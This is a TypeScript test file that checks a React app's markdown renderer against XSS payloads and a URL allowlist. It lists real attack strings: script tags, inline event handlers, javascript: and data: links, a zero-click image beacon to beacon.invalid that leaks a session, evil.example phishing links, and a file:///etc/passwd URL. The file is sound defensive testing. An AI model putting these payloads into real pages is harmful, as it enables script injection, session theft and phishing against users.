/**
 * XSS render tests for the app's markdown surfaces
 * (doc/SECURITY_XSS_PROMPT_INJECTION.md findings X1/P2, mitigation §5.2).
 *
 * These render through the SAME `react-markdown` version and the SAME props the
 * app passes, then inspect the resulting DOM. They are not string assertions
 * about our sanitizer — they check what a browser would actually build, which
 * is the only question that matters at this layer.
 *
 * Every payload is a real attack string. Hostnames use RFC 2606 reserved
 * domains (`.example`, `.invalid`) so no test can reach a live host. jsdom does
 * not fetch images, so a surviving `<img src>` is asserted as an element rather
 * than as a network request — that element IS the beacon in a real browser.
 */

import { describe, expect, it, beforeEach, afterEach } from "vitest";
import { render, cleanup } from "@testing-library/react";
import ReactMarkdown from "react-markdown";
import { MARKDOWN_DISALLOWED_ELEMENTS, safeUrlTransform } from "./markdownSafety";

/**
 * Renders markdown exactly as the app does: the hardening props from
 * `markdownSafety`, nothing else.
 */
function renderHardened(markdown: string): HTMLElement {
  const { container } = render(
    <ReactMarkdown disallowedElements={MARKDOWN_DISALLOWED_ELEMENTS} urlTransform={safeUrlTransform}>
      {markdown}
    </ReactMarkdown>,
  );
  return container;
}

/** Renders with react-markdown's defaults — the "before" column of the report. */
function renderUnhardened(markdown: string): HTMLElement {
  const { container } = render(<ReactMarkdown>{markdown}</ReactMarkdown>);
  return container;
}

const PAYLOADS: Array<{ id: string; label: string; payload: string }> = [
  { id: "X-script", label: "raw <script> tag", payload: '<script>window.__pwn=1</script>' },
  { id: "X-img-onerror", label: "<img onerror> handler", payload: '<img src=x onerror="window.__pwn=1">' },
  { id: "X-svg-onload", label: "<svg onload> handler", payload: '<svg onload="window.__pwn=1"></svg>' },
  { id: "X-b-onmouseover", label: "event handler on a formatting tag", payload: '<b onmouseover="window.__pwn=1">hover</b>' },
  { id: "X-js-link", label: "javascript: link", payload: "[click](javascript:window.__pwn=1)" },
  { id: "X-data-link", label: "data:text/html link", payload: "[click](data:text/html,<script>window.__pwn=1</script>)" },
  { id: "X-beacon-img", label: "external image beacon (zero-click)", payload: "![](https://beacon.invalid/p.png?leak=session)" },
  { id: "X-phish-link", label: "external phishing link", payload: "[Log in to continue](https://evil.example/login)" },
  { id: "X-js-autolink", label: "javascript: autolink", payload: "<javascript:window.__pwn=1>" },
  { id: "X-proto-relative", label: "protocol-relative link", payload: "[x](//evil.example/steal)" },
];

beforeEach(() => {
  delete (window as unknown as Record<string, unknown>).__pwn;
});
afterEach(cleanup);

describe("markdown render — no payload produces an executable or fetching node", () => {
  for (const { id, label, payload } of PAYLOADS) {
    it(`${id}: ${label}`, () => {
      const container = renderHardened(`Prose before. ${payload} Prose after.`);

      // No script ever, and no element carrying an inline event handler.
      expect(container.querySelectorAll("script")).to.have.length(0);
      for (const el of container.querySelectorAll("*")) {
        for (const attr of el.attributes) {
          expect(attr.name.toLowerCase().startsWith("on")).toBe(false);
        }
      }
      // No image element: in a real browser this is the zero-click beacon.
      expect(container.querySelectorAll("img")).to.have.length(0);
      // No anchor may point off-allowlist or at a script scheme.
      for (const a of container.querySelectorAll("a")) {
        const href = a.getAttribute("href") ?? "";
        expect(href.toLowerCase()).not.toContain("javascript:");
        expect(href.toLowerCase()).not.toContain("data:");
        expect(href).not.toContain("evil.example");
        expect(href).not.toContain("beacon.invalid");
      }
      // Nothing executed during render.
      expect((window as unknown as Record<string, unknown>).__pwn).toBeUndefined();
      // The surrounding prose is still there — hardening is not censoring.
      expect(container.textContent).toContain("Prose before.");
      expect(container.textContent).toContain("Prose after.");
    });
  }
});

describe("markdown render — what the hardening actually changed", () => {
  it("the beacon image renders WITHOUT hardening and not WITH it (the X1 regression guard)", () => {
    // This is the finding the assessment confirmed live: react-markdown's
    // defaults escape script but happily emit an external <img>.
    const before = renderUnhardened("![](https://beacon.invalid/p.png?leak=session)");
    expect(before.querySelectorAll("img")).to.have.length(1);
    cleanup();

    const after = renderHardened("![](https://beacon.invalid/p.png?leak=session)");
    expect(after.querySelectorAll("img")).to.have.length(0);
  });

  it("the phishing link is live WITHOUT hardening and inert WITH it", () => {
    const before = renderUnhardened("[Log in](https://evil.example/login)");
    expect(before.querySelector("a")?.getAttribute("href")).to.equal("https://evil.example/login");
    cleanup();

    const after = renderHardened("[Log in](https://evil.example/login)");
    const href = after.querySelector("a")?.getAttribute("href") ?? "";
    expect(href).to.not.include("evil.example");
    // The words survive so the reader still sees the claim.
    expect(after.textContent).to.include("Log in");
  });
});

describe("markdown render — legitimate content still works", () => {
  it("keeps this app's inline receipt-citation anchors", () => {
    const id = "3f2a8c11-0000-4000-8000-000000000000";
    const container = renderHardened(`Handled here [1](#receipt:${id}).`);
    expect(container.querySelector("a")?.getAttribute("href")).to.equal(`#receipt:${id}`);
  });

  it("keeps the unverified-claim anchor", () => {
    const container = renderHardened("[This claim cites nothing](#unverified)");
    expect(container.querySelector("a")?.getAttribute("href")).to.equal("#unverified");
  });

  it("keeps github links and relative links", () => {
    const gh = renderHardened("[src](https://github.com/o/r/blob/main/a.ts)");
    expect(gh.querySelector("a")?.getAttribute("href")).to.equal("https://github.com/o/r/blob/main/a.ts");
    cleanup();
    const rel = renderHardened("[settings](/settings)");
    expect(rel.querySelector("a")?.getAttribute("href")).to.equal("/settings");
  });

  it("renders ordinary formatting, code, lists, and tables", () => {
    const container = renderHardened(
      ["**bold** and `code`", "", "- one", "- two", "", "```ts", "const x = 1;", "```"].join("\n"),
    );
    expect(container.querySelector("strong")?.textContent).to.equal("bold");
    expect(container.querySelectorAll("li")).to.have.length(2);
    expect(container.querySelector("pre code")?.textContent).to.include("const x = 1;");
  });

  it("shows a quoted HTML example as visible text rather than markup", () => {
    // Repo content legitimately contains tags; the reader must still see them.
    const container = renderHardened("The fixture contains `<img src=x onerror=1>` verbatim.");
    expect(container.querySelectorAll("img")).to.have.length(0);
    expect(container.querySelector("code")?.textContent).to.equal("<img src=x onerror=1>");
  });
});

describe("safeUrlTransform — the allowlist itself", () => {
  it("accepts anchors, relative paths, and https github.com", () => {
    expect(safeUrlTransform("#receipt:abc")).to.equal("#receipt:abc");
    expect(safeUrlTransform("#unverified")).to.equal("#unverified");
    expect(safeUrlTransform("/settings")).to.equal("/settings");
    expect(safeUrlTransform("./x")).to.equal("./x");
    expect(safeUrlTransform("https://github.com/o/r")).to.equal("https://github.com/o/r");
    expect(safeUrlTransform("https://gist.github.com/o/1")).to.equal("https://gist.github.com/o/1");
  });

  it("rejects script schemes, off-allowlist hosts, and lookalike domains", () => {
    for (const bad of [
      "javascript:window.__pwn=1",
      "JaVaScRiPt:alert(1)",
      "data:text/html,<script>1</script>",
      "vbscript:msgbox",
      "file:///etc/passwd",
      "//evil.example/steal",
      "https://evil.example",
      "http://github.com/o/r",
      "https://github.com.evil.example/o/r",
      "https://notgithub.com/o/r",
      "java\tscript:alert(1)",
      "",
      "   ",
    ]) {
      expect(safeUrlTransform(bad), `should reject ${JSON.stringify(bad)}`).to.equal("");
    }
  });
});
